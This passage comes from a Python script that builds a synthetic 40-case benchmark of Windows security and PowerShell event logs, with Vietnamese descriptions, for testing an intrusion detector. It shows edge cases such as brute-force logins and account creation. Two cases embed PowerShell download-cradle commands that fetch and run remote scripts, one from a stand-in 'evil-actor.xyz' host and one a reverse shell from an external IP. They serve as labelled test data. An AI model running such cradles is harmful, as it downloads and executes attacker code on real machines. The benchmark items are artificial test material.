    write_case_to_data01("case_edge_02_admin_typo_twice", "EdgeCase", "NORMAL", "Quản trị viên gõ nhầm pass 2 lần rồi vào thành công kiểm tra mạng.", [], sec, ps)

    # 33. Automated inventory tool
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 3301, {"TargetUserName": "SYSTEM", "LogonType": "5"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=2)), 3302, {"SubjectUserName": "SYSTEM", "NewProcessName": "whoami.exe", "CommandLine": "whoami"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=5)), 3303, {"SubjectUserName": "SYSTEM", "NewProcessName": "systeminfo.exe", "CommandLine": "systeminfo"}))
    write_case_to_data01("case_edge_03_automated_inventory_tool", "EdgeCase", "NORMAL", "Công cụ thống kê tài sản phần cứng tự động kiểm tra hệ thống.", [], sec, ps)

    # 34. IT create employee account
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 3401, {"TargetUserName": "it_support", "LogonType": "2"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=8)), 3402, {"SubjectUserName": "it_support", "NewProcessName": "net.exe", "CommandLine": "net user nhanvien_moi TempP@ss2026 /add"}))
    write_case_to_data01("case_edge_04_it_create_employee_account", "EdgeCase", "NORMAL", "Quy trình nhân sự tạo tài khoản nhân viên mới hợp lệ không kèm leo thang.", [], sec, ps)

    # 35. Bruteforce all failed
    sec, ps = [], []
    for i in range(10):
        sec.append(create_security_event_xml(4625, format_win_time(base + timedelta(seconds=i*2)), 3501+i, {
            "TargetUserName": "root", "LogonType": "3", "IpAddress": "203.0.113.55"
        }))
    write_case_to_data01("case_edge_05_bruteforce_all_failed", "EdgeCase", "ALERT", "Dò mật khẩu liên tục 10 lần từ bên ngoài nhưng thất bại hoàn toàn.", ["Password Brute Force (MITRE T1110)"], sec, ps)

    # 36. Dual session different IP
    sec, ps = [], []
    sec.append(create_security_event_xml(4624, format_win_time(base), 3601, {"TargetUserName": "staff_1", "LogonType": "3", "IpAddress": "192.168.1.10"}))
    sec.append(create_security_event_xml(4624, format_win_time(base + timedelta(seconds=4)), 3602, {"TargetUserName": "staff_2", "LogonType": "3", "IpAddress": "192.168.1.12"}))
    sec.append(create_security_event_xml(4688, format_win_time(base + timedelta(seconds=8)), 3603, {"SubjectUserName": "staff_1", "NewProcessName": "explorer.exe", "CommandLine": "explorer.exe \\\\fileserver\\shared"}))
    write_case_to_data01("case_edge_06_dual_session_different_ip", "EdgeCase", "NORMAL", "Hai người dùng nội bộ cùng truy cập thư mục chia sẻ tệp công ty.", [], sec, ps)

    # 37. Scheduled script failed
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 3701, {"SubjectUserName": "backup_user", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -File check_status.ps1"}))
    ps.append(create_powershell_event_xml("Test-Path D:\\DataShared; Write-Error 'Path unreachable'; exit 1", format_win_time(base + timedelta(seconds=3)), 3702))
    write_case_to_data01("case_edge_07_scheduled_script_failed", "EdgeCase", "NORMAL", "Tác vụ tự động kiểm tra trạng thái gặp lỗi đường dẫn không hợp lệ.", [], sec, ps)

    # 38. Guest account login attempt
    sec, ps = [], []
    for i in range(5):
        sec.append(create_security_event_xml(4625, format_win_time(base + timedelta(seconds=i*3)), 3801+i, {
            "TargetUserName": "Guest", "LogonType": "3", "IpAddress": "192.168.50.100"
        }))
    write_case_to_data01("case_edge_08_guest_account_login_attempt", "EdgeCase", "ALERT", "Kẻ xâm nhập cố tình dò quét tài khoản Guest bị vô hiệu hóa.", ["Password Brute Force (MITRE T1110)"], sec, ps)

    # 39. Suspicious script benign name
    sec, ps = [], []
    sec.append(create_security_event_xml(4688, format_win_time(base), 3901, {
        "SubjectUserName": "user_finance", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\WindowsUpdate.ps1"
    }))
    ps.append(create_powershell_event_xml("iex (New-Object Net.WebClient).DownloadString('http://evil-actor.xyz/beacon.ps1')", format_win_time(base + timedelta(seconds=2)), 3902))
    write_case_to_data01("case_edge_09_suspicious_script_benign_name", "EdgeCase", "ALERT", "Script ngụy trang tên WindowsUpdate nhưng nội dung là tải C2 beacon.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)

    # 40. Remote desktop after hours
    sec, ps = [], []
    after_hours = datetime(2026, 10, 27, 2, 30, 0)
    sec.append(create_security_event_xml(4624, format_win_time(after_hours), 4001, {
        "TargetUserName": "night_operator", "LogonType": "10", "IpAddress": "185.220.101.5"
    }))
    sec.append(create_security_event_xml(4688, format_win_time(after_hours + timedelta(seconds=5)), 4002, {
        "SubjectUserName": "night_operator", "NewProcessName": "powershell.exe", "CommandLine": "powershell.exe -w hidden -enc SQBFAFgAIAA..."
    }))
    ps.append(create_powershell_event_xml("IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/reverse.ps1')", format_win_time(after_hours + timedelta(seconds=8)), 4003))
    write_case_to_data01("case_edge_10_remote_desktop_after_hours", "EdgeCase", "ALERT", "Đăng nhập RDP từ IP nước ngoài lúc 2h30 sáng tải reverse shell.", ["Malware Execution / PowerShell Download Cradle (MITRE T1059.001)"], sec, ps)


def main():
    parser = argparse.ArgumentParser(description="Khởi tạo chuẩn 40 ca kiểm thử vào thư mục data01/.")
    parser.add_argument("--clean", action="store_true", help="Xóa sạch thư mục data01/")
    args = parser.parse_args()

    if args.clean:
        if TARGET_DIR.is_dir():
            shutil.rmtree(TARGET_DIR)
            print("[✓] Đã dọn dẹp sạch thư mục data01/!")
        return

    TARGET_DIR.mkdir(parents=True, exist_ok=True)

    print("=" * 80)
    print("      KHỞI TẠO BỘ BENCHMARK CHUẨN 40 CA KIỂM THỬ VÀO THƯ MỤC data01/")
    print("=" * 80)
    print(f" - Thư mục đích : {TARGET_DIR}")
    print(" - Phân bổ     : 10 Benign + 10 Attack + 10 Mixed + 10 Edge Cases")
    print("-" * 80)

    generate_all_40_cases()

    print("=" * 80)
    print("[✓] HOÀN TẤT KHỞI TẠO 40 CA KIỂM THỬ TRONG data01/!")
    print("    Hệ thống đã sẵn sàng cho bài đánh giá toàn diện:")
    print("    .\\.venv\\Scripts\\python.exe core\\evaluate.py --data-dir data01")
    print("=" * 80)


if __name__ == "__main__":
    main()

